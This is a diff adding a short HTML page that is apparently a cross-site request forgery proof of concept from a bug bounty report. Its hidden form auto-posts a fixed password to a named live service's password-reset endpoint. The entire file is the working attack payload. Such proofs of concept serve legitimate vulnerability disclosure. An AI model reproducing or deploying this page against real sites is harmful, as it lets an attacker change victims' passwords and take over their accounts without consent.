@@ -1,0 +1,8 @@
+<html>
+  <body>
+    <form action="https://www.cameo.com/api/auth/resetPassword" method="POST" enctype="text/plain">
+      <input type="hidden" name="password" value="Bugbounty277777222" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
